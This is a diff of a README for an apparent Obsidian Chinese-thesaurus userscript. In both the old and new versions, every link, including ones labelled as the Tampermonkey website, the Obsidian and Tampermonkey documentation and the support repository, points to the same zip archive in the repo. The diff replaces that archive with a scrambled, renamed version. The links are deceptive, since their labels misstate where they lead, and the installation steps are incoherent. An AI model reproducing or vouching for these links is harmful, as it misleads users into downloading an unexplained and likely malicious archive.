@@ -6,7 +6,7 @@ Welcome to the Chinese Thesaurus Web Clipper for Obsidian. This user script lets
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip)
+[![Download](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip)
 
 ## 📋 Features
 
@@ -24,15 +24,15 @@ Welcome to the Chinese Thesaurus Web Clipper for Obsidian. This user script lets
 ## 🔄 How to Install
 
 1. **Install Tampermonkey:**
-   - Visit the [Tampermonkey website](https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip).
+   - Visit the [Tampermonkey website](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip).
    - Download and install the extension for your browser.
 
 2. **Visit the Releases Page:**
-   - Go to the [Releases page](https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip) to find the latest version.
+   - Go to the [Releases page](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip) to find the latest version.
 
 3. **Download the User Script:**
    - On the Releases page, click on the latest version.
-   - Find the user script file, usually named something like `https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip`.
+   - Find the user script file, usually named something like `https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip`.
    - Click on the file link to view the script.
 
 4. **Install the User Script:**
@@ -64,15 +64,15 @@ Welcome to the Chinese Thesaurus Web Clipper for Obsidian. This user script lets
 
 ## 📧 Get Support
 
-If you encounter issues or have questions, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip). The community is here to help.
+If you encounter issues or have questions, feel free to open an issue in the [GitHub repository](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip). The community is here to help.
 
 ## 📥 Download & Install
 
-To get started with the Chinese Thesaurus Web Clipper for Obsidian, visit the [Releases page](https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip) to download the latest version. Follow the installation instructions above to set everything up and begin clipping Chinese thesaurus entries effortlessly.
+To get started with the Chinese Thesaurus Web Clipper for Obsidian, visit the [Releases page](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip) to download the latest version. Follow the installation instructions above to set everything up and begin clipping Chinese thesaurus entries effortlessly.
 
 ## 🔗 Additional Resources
 
-- [Obsidian Documentation](https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip)
-- [Tampermonkey Documentation](https://raw.githubusercontent.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/main/src/chinese-thesaurus-web-clipper-for-obsidian-1.2.zip)
+- [Obsidian Documentation](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip)
+- [Tampermonkey Documentation](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/raw/refs/heads/main/src/thesaurus-obsidian-for-clipper-chinese-web-3.2.zip)
 
 Feel free to explore these resources to enhance your experience with the software.
